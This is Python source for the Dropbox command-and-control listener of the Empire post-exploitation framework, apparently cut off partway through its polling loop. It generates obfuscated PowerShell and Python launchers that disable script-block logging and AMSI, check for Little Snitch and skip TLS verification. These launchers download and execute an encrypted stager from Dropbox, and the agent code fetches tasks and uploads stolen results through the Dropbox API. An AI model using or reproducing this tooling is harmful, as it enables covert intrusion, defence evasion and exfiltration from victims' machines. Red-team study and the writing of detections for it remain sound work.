import base64
import random
import os
import time
import copy
import dropbox
# from dropbox.exceptions import ApiError, AuthError
# from dropbox.files import FileMetadata, FolderMetadata, CreateFolderError
from pydispatch import dispatcher

# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages


class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Dropbox',

            'Author': ['@harmj0y'],

            'Description': ('Starts a Dropbox listener.'),

            'Category' : ('third_party'),

            'Comments': []
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'dropbox'
            },
            'APIToken' : {
                'Description'   :   'Authorization token for Dropbox API communication.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'PollInterval' : {
                'Description'   :   'Polling interval (in seconds) to communicate with the Dropbox Server.',
                'Required'      :   True,
                'Value'         :   '5'
            },
            'BaseFolder' : {
                'Description'   :   'The base Dropbox folder to use for comms.',
                'Required'      :   True,
                'Value'         :   '/Empire/'
            },
            'StagingFolder' : {
                'Description'   :   'The nested Dropbox staging folder.',
                'Required'      :   True,
                'Value'         :   '/staging/'
            },
            'TaskingsFolder' : {
                'Description'   :   'The nested Dropbox taskings folder.',
                'Required'      :   True,
                'Value'         :   '/taskings/'
            },
            'ResultsFolder' : {
                'Description'   :   'The nested Dropbox results folder.',
                'Required'      :   True,
                'Value'         :   '/results/'
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   60
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   10
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        Returns a default HTTP server page.
        """
        return ''


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/dbx generate_launcher(): no language specified!')

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            # host = listenerOptions['Host']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
            launcher = listenerOptions['Launcher']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            pollInterval = listenerOptions['PollInterval']['Value']
            apiToken = listenerOptions['APIToken']['Value']
            baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
            stagingFolder = "/%s/%s" % (baseFolder, listenerOptions['StagingFolder']['Value'].strip('/'))
            taskingsFolder = "/%s/%s" % (baseFolder, listenerOptions['TaskingsFolder']['Value'].strip('/'))
            resultsFolder = "/%s/%s" % (baseFolder, listenerOptions['ResultsFolder']['Value'].strip('/'))

            if language.startswith('po'):
                # PowerShell

                stager = ''
                if safeChecks.lower() == 'true':
                    # ScriptBlock Logging bypass
                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.Utils'"
                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"

                    # @mattifestation's AMSI bypass
                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':

                    if userAgent.lower() != 'none':
                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                        stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
                        if proxyCreds.lower() == "default":
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            # TODO: implement form for other proxy credentials
                            pass

                # TODO: reimplement stager retries?

                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # add in the Dropbox auth token and API params
                stager += "$t='%s';" % (apiToken)
                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "\"Authorization\",\"Bearer $t\");"
                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "\"Dropbox-API-Arg\",'{\"path\":\"%s/debugps\"}');" % (stagingFolder)

                stager += helpers.randomize_capitalization("$data=$WC.DownloadData('")
                stager += "https://content.dropboxapi.com/2/files/download');"
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                # base64 encode the stager and return it
                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            elif language.startswith('py'):
                launcherBase = 'import sys;'
                # monkey patch ssl woohooo
                launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
                        launcherBase += "out = ps.stdout.read()\n"
                        launcherBase += "ps.stdout.close()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print helpers.color(p, color='red')

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]

                launcherBase += "import urllib2;\n"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "t='%s';" % (apiToken)
                launcherBase += "server='https://content.dropboxapi.com/2/files/download';"

                launcherBase += "req=urllib2.Request(server);\n"
                launcherBase += "req.add_header('User-Agent',UA);\n"
                launcherBase += "req.add_header(\"Authorization\",\"Bearer \"+t);"
                launcherBase += "req.add_header(\"Dropbox-API-Arg\",'{\"path\":\"%s/debugpy\"}');\n" % (stagingFolder)


                launcherBase += "if urllib2.getproxies():\n"
                launcherBase += "   o = urllib2.build_opener();\n"
                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
                launcherBase += "   urllib2.install_opener(o);\n"

                launcherBase += "a=urllib2.urlopen(req).read();\n"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

        else:
            print helpers.color("[!] listeners/dbx generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/dbx generate_stager(): no language specified!')
            return None

        pollInterval = listenerOptions['PollInterval']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
        apiToken = listenerOptions['APIToken']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        stagingFolder = "/%s/%s" % (baseFolder, listenerOptions['StagingFolder']['Value'].strip('/'))

        if language.lower() == 'powershell':

            # read in the stager base
            f = open("%s/data/agent/stagers/dropbox.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # patch the server and key information
            stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
            stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)

            #patch in working hours, if any
            if workingHours != "":
                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)

            randomizedStager = ''

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
            else:
                # otherwise just return the case-randomized stager
                return randomizedStager


        elif language.lower() == 'python':

            f = open("%s/data/agent/stagers/dropbox.py" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            stager = helpers.strip_python_comments(stager)
            # patch the server and key information
            stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
            stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
            stager = stager.replace('REPLACE_PROFILE', profile)
            stager = stager.replace('REPLACE_API_TOKEN', apiToken)

            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_agent(self, listenerOptions, language=None):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/dbx generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'powershell':
            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+b64DefaultResponse+'"')

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")

            return code
        elif language == 'python':
            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
            code = f.read()
            f.close()

            #path in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            #strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            #patch some more 
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

            return code
        else:
            print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module.")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        stagingKey = listenerOptions['StagingKey']['Value']
        pollInterval = listenerOptions['PollInterval']['Value']
        apiToken = listenerOptions['APIToken']['Value']
        baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
        taskingsFolder = "/%s/%s" % (baseFolder, listenerOptions['TaskingsFolder']['Value'].strip('/'))
        resultsFolder = "/%s/%s" % (baseFolder, listenerOptions['ResultsFolder']['Value'].strip('/'))

        if language:
            if language.lower() == 'powershell':

                updateServers = """
    $Script:APIToken = "%s";
                """ % (apiToken)

                getTask = """
    function script:Get-Task {
        try {
            # build the web request object
            $wc = New-Object System.Net.WebClient

            # set the proxy settings for the WC to be the default system settings
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add("User-Agent", $script:UserAgent)
            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}

            $TaskingsFolder = "%s"
            $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)")
            $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
            $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")

            if($Data -and ($Data.Length -ne 0)) {
                # if there was a tasking data, remove it
                $wc.Headers.Add("Content-Type", " application/json")
                $wc.Headers.Remove("Dropbox-API-Arg")
                $Null=$wc.UploadString("https://api.dropboxapi.com/2/files/delete", "POST", "{`"path`":`"$TaskingsFolder/$($script:SessionID).txt`"}")
                $Data
            }
            $script:MissedCheckins = 0
        }
        catch {
            if ($_ -match 'Unable to connect') {
                $script:MissedCheckins += 1
            }
        }
    }
                """ % (taskingsFolder)

                sendMessage = """
    function script:Send-Message {
        param($Packets)

        if($Packets) {
            # build and encrypt the response packet
            $EncBytes = Encrypt-Bytes $Packets

            # build the top level RC4 "routing packet"
            # meta 'RESULT_POST' : 5
            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

            # build the web request object
            $wc = New-Object System.Net.WebClient
            # set the proxy settings for the WC to be the default system settings
            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
            $wc.Headers.Add('User-Agent', $Script:UserAgent)
            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}

            $ResultsFolder = "%s"

            try {
                # check if the results file is still in the specified location, if so then
                #   download the file and append the new routing packet to it
                try {
                    $Data = $Null
                    $wc.Headers.Set("Authorization", "Bearer $($Script:APIToken)");
                    $wc.Headers.Set("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
                    $Data = $wc.DownloadData("https://content.dropboxapi.com/2/files/download")
                }
                catch { }

                if($Data -and $Data.Length -ne 0) {
                    $RoutingPacket = $Data + $RoutingPacket
                }

                $wc2 = New-Object System.Net.WebClient
                $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
                $wc2.Headers.Add("Content-Type", "application/octet-stream")
                $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
                $Null = $wc2.UploadData("https://content.dropboxapi.com/2/files/upload", "POST", $RoutingPacket)
                $script:MissedCheckins = 0
            }
            catch {
                if ($_ -match 'Unable to connect') {
                    $script:MissedCheckins += 1
                }
            }
        }
    }
                """ % (resultsFolder)

                return updateServers + getTask + sendMessage

            elif language.lower() == 'python':

                sendMessage = """
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    def post_message(uri, data, headers):
        req = urllib2.Request(uri)
        headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
        for key, value in headers.iteritems():
            req.add_header("%s"%(key),"%s"%(value))

        if data:
            req.add_data(data)

        o=urllib2.build_opener()
        o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))
        urllib2.install_opener(o)

        return urllib2.urlopen(req).read()

    global missedCheckins
    global headers
    taskingsFolder="REPLACE_TASKSING_FOLDER"
    resultsFolder="REPLACE_RESULTS_FOLDER"
    data = None
    requestUri=''
    try:
        del headers['Content-Type']
    except:
        pass

    
    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
        #check to see if there are any results already present
        
        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
        
        try:
            pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
        except:
            pkdata = None

        if pkdata and len(pkdata) > 0:
            data = pkdata + data

        headers['Content-Type'] = "application/octet-stream"
        requestUri = 'https://content.dropboxapi.com/2/files/upload'
    else:
        headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
        requestUri='https://content.dropboxapi.com/2/files/download'

    try:
        resultdata = post_message(requestUri, data, headers)
        if (resultdata and len(resultdata) > 0) and requestUri.endswith('download'):
            headers['Content-Type'] = "application/json"
            del headers['Dropbox-API-Arg']
            datastring="{\\"path\\":\\"%s/%s.txt\\"}" % (taskingsFolder, sessionID)
            nothing = post_message('https://api.dropboxapi.com/2/files/delete', datastring, headers)

        return ('200', resultdata)

    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        return (HTTPError.code, '')

    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')
"""
                sendMessage = sendMessage.replace('REPLACE_TASKSING_FOLDER', taskingsFolder)
                sendMessage = sendMessage.replace('REPLACE_RESULTS_FOLDER', resultsFolder)
                sendMessage = sendMessage.replace('REPLACE_API_TOKEN', apiToken)
                return sendMessage
        else:
            print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')


    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up polling server for Dropbox
        polling communication.

        ./Empire/
            ./staging/
                stager.ps1
                SESSION_[1-4].txt
            ./taskings/
                SESSIONID.txt
            ./results/
                SESSIONID.txt

        /Empire/staging/stager.ps1       -> RC4staging(stager.ps1) uploaded by server
        /Empire/staging/sessionID_1.txt  -> AESstaging(PublicKey) uploaded by client
        /Empire/staging/sessionID_2.txt  -> RSA(nonce+AESsession) uploaded by server
        /Empire/staging/sessionID_3.txt  -> AESsession(nonce+sysinfo) uploaded by client
        /Empire/staging/sessionID_4.txt  -> AESsession(agent.ps1) uploaded by server


        client                                              dropbox                             server
                                                                                        <- upload /Empire/staging/stager.ps1
        read /Empire/staging/stager                     ->
                                                        <-  return stager
        generate sessionID
        upload /Empire/staging/sessionID_1.txt          ->
                                                                                        <- read /Empire/staging/sessionID_1.txt
                                                                                        <- upload /Empire/staging/sessionID_2.txt
        read /Empire/staging/sessionID_2.txt            ->
                                                        <- /Empire/staging/sessionID_2.txt
        upload /Empire/staging/sessionID_3.txt          ->
                                                                                        <- read /Empire/staging/sessionID_3.txt
                                                                                        <- upload /Empire/staging/sessionID_4.txt
        read /Empire/staging/sessionID_4.txt            ->
                                                        <- /Empire/staging/sessionID_4.txt

        <start beaconing>
                                                                                        <- upload /Empire/taskings/sessionID.txt
        read /Empire/taskings/sessionID.txt             ->
                                                        <- /Empire/taskings/sessionID.txt
        delete /Empire/taskings/sessionID.txt           ->

        execute code
        upload /Empire/results/sessionID.txt            ->
                                                                                        <- read /Empire/results/sessionID.txt
                                                                                        <- delete /Empire/results/sessionID.txt

        """

        def download_file(dbx, path):
            # helper to download a file at the given path
            try:
                md, res = dbx.files_download(path)
            except dropbox.exceptions.HttpError as err:
                dispatcher.send("[!] Error download data from '%s' : %s" % (path, err), sender="listeners/dropbox")
                return None
            return res.content

        def upload_file(dbx, path, data):
            # helper to upload a file to the given path
            try:
                dbx.files_upload(data, path)
            except dropbox.exceptions.ApiError:
                dispatcher.send("[!] Error uploading data to '%s'" % (path), sender="listeners/dropbox")

        def delete_file(dbx, path):
            # helper to delete a file at the given path
            try:
                dbx.files_delete(path)
            except dropbox.exceptions.ApiError:
                dispatcher.send("[!] Error deleting data at '%s'" % (path), sender="listeners/dropbox")


        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        stagingKey = listenerOptions['StagingKey']['Value']
        pollInterval = listenerOptions['PollInterval']['Value']
        apiToken = listenerOptions['APIToken']['Value']
        listenerName = listenerOptions['Name']['Value']
        baseFolder = listenerOptions['BaseFolder']['Value'].strip('/')
        stagingFolder = "/%s/%s" % (baseFolder, listenerOptions['StagingFolder']['Value'].strip('/'))
        taskingsFolder = "/%s/%s" % (baseFolder, listenerOptions['TaskingsFolder']['Value'].strip('/'))
        resultsFolder = "/%s/%s" % (baseFolder, listenerOptions['ResultsFolder']['Value'].strip('/'))

        dbx = dropbox.Dropbox(apiToken)

        # ensure that the access token supplied is valid
        try:
            dbx.users_get_current_account()
        except dropbox.exceptions.AuthError as err:
            print helpers.color("[!] ERROR: Invalid access token; try re-generating an access token from the app console on the web.")
            return False

        # setup the base folder structure we need
        try:
            dbx.files_create_folder(stagingFolder)
        except dropbox.exceptions.ApiError:
            dispatcher.send("[*] Dropbox folder '%s' already exists" % (stagingFolder), sender="listeners/dropbox")
        try:
            dbx.files_create_folder(taskingsFolder)
        except dropbox.exceptions.ApiError:
            dispatcher.send("[*] Dropbox folder '%s' already exists" % (taskingsFolder), sender="listeners/dropbox")
        try:
            dbx.files_create_folder(resultsFolder)
        except dropbox.exceptions.ApiError:
            dispatcher.send("[*] Dropbox folder '%s' already exists" % (resultsFolder), sender="listeners/dropbox")

        # upload the stager.ps1 code
        stagerCodeps = self.generate_stager(listenerOptions=listenerOptions, language='powershell')
        stagerCodepy = self.generate_stager(listenerOptions=listenerOptions, language='python')
        try:
            # delete stager if it exists
            delete_file(dbx, "%s/debugps" % (stagingFolder))
            delete_file(dbx, "%s/debugpy" % (stagingFolder))
            dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
            dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
        except dropbox.exceptions.ApiError:
            print helpers.color("[!] Error uploading stager to '%s/stager'" % (stagingFolder))
            return

        while True:

            time.sleep(int(pollInterval))

            # search for anything in /Empire/staging/*
            for match in dbx.files_search(stagingFolder, "*.txt").matches:
                fileName = str(match.metadata.path_display)
                relName = fileName.split('/')[-1][:-4]
                sessionID, stage = relName.split('_')
                sessionID = sessionID.upper()

                if '_' in relName:
                    if stage == '1':
                        try:
                            md, res = dbx.files_download(fileName)
                        except dropbox.exceptions.HttpError as err:
                            dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
                            continue
                        stageData = res.content

                        dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, stageData, listenerOptions)
                        if dataResults and len(dataResults) > 0:
                            for (language, results) in dataResults:
                                # TODO: more error checking
                                try:
                                    dbx.files_delete(fileName)
                                except dropbox.exceptions.ApiError:
                                    dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
                                try:
                                    stageName = "%s/%s_2.txt" % (stagingFolder, sessionID)
                                    dispatcher.send("[*] Uploading key negotiation part 2 to %s for %s" % (stageName, sessionID), sender='listeners/dbx')
                                    dbx.files_upload(results, stageName)
                                except dropbox.exceptions.ApiError:
                                    dispatcher.send("[!] Error uploading data to '%s'" % (stageName), sender="listeners/dropbox")

                    if stage == '3':
                        try:
                            md, res = dbx.files_download(fileName)
                        except dropbox.exceptions.HttpError as err:
                            dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
                            continue
                        stageData = res.content

                        dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, stageData, listenerOptions)
                        if dataResults and len(dataResults) > 0:
                            # print "dataResults:",dataResults
                            for (language, results) in dataResults:
                                if results.startswith('STAGE2'):
                                    sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
                                    dispatcher.send("[*] Sending agent (stage 2) to %s through Dropbox" % (sessionID), sender='listeners/dbx')

                                    try:
                                        dbx.files_delete(fileName)
                                    except dropbox.exceptions.ApiError:
                                        dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")

                                    try:
                                        fileName2 = fileName.replace("%s_3.txt" % (sessionID), "%s_2.txt" % (sessionID))
                                        dbx.files_delete(fileName2)
                                    except dropbox.exceptions.ApiError:
                                        dispatcher.send("[!] Error deleting data at '%s'" % (fileName2), sender="listeners/dropbox")

                                    # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                                    agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
                                    returnResults = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)

                                    try:
                                        stageName = "%s/%s_4.txt" % (stagingFolder, sessionID)
                                        dispatcher.send("[*] Uploading key negotiation part 4 (agent) to %s for %s" % (stageName, sessionID), sender='listeners/dbx')
                                        dbx.files_upload(returnResults, stageName)
                                    except dropbox.exceptions.ApiError:
                                        dispatcher.send("[!] Error uploading data to '%s'" % (stageName), sender="listeners/dropbox")


            # get any taskings applicable for agents linked to this listener
            sessionIDs = self.mainMenu.agents.get_agents_for_listener(listenerName)
            for sessionID in sessionIDs:
                taskingData = self.mainMenu.agents.handle_agent_request(sessionID, 'powershell', stagingKey)
